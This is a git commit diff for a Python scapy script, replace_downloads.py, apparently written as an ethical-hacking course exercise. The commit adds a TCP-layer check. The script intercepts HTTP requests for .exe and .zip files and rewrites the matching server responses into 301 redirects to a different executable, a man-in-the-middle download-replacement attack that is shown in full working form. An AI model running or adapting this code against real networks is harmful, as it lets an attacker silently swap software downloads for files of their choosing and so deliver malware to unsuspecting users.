c79ef7a838f569ca8ff999677d053efa6a1e6d1d
razorboy73 <joshadamkerbel@gmail.com>
2024-07-23 15:37:31 -0400

    added TCP layer detection

--- replace_downloads.py
+++ replace_downloads.py
@@ -16,27 +16,29 @@ def process_packet(packet):
     # convert packet to a scapy packet
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.Raw):
-        # http data is in the raw layer
-        # if the destination port is 80, its a request
-        if scapy_packet[scapy.TCP].dport == 80:
-            print("[+]HTTP REQUEST")
-            load = scapy_packet[scapy.Raw].load
-            keywords = [".zip", ".ZIP", ".exe", ".EXE"]
-            for keyword in keywords:
-                if keyword in str(load):
-                    print("[+]EXE or ZIP Request")
-                    # store the ack/seq from the TCP layer of the http request
-                    ack_list.append(scapy_packet[scapy.TCP].ack)
+        #check if there is a tcp layer
+        if scapy_packet.haslayer(scapy.TCP):
+            # http data is in the raw layer
+            # if the destination port is 80, its a request
+            if scapy_packet[scapy.TCP].dport == 80:
+                print("[+]HTTP REQUEST")
+                load = scapy_packet[scapy.Raw].load
+                keywords = [".zip", ".ZIP", ".exe", ".EXE"]
+                for keyword in keywords:
+                    if keyword in str(load):
+                        print("[+]EXE or ZIP Request")
+                        # store the ack/seq from the TCP layer of the http request
+                        ack_list.append(scapy_packet[scapy.TCP].ack)
+                        print(scapy_packet.show())
+            # a packet is leaving via an http port
+            elif scapy_packet[scapy.TCP].sport == 80:
+                print("[+]HTTP Response")
+                if scapy_packet[scapy.TCP].seq in ack_list:
+                    ack_list.remove(scapy_packet[scapy.TCP].seq)
+                    print("[+] Replacing file")
+                    modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: https://www.rarlab.com/rar/winrar-x64-701ca.exe\n\n")
+                    packet.set_payload(bytes(modified_packet))
                     print(scapy_packet.show())
-        # a packet is leaving via an http port
-        elif scapy_packet[scapy.TCP].sport == 80:
-            print("[+]HTTP Response")
-            if scapy_packet[scapy.TCP].seq in ack_list:
-                ack_list.remove(scapy_packet[scapy.TCP].seq)
-                print("[+] Replacing file")
-                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: https://www.rarlab.com/rar/winrar-x64-701ca.exe\n\n")
-                packet.set_payload(bytes(modified_packet))
-                print(scapy_packet.show())
 
     packet.accept()
 
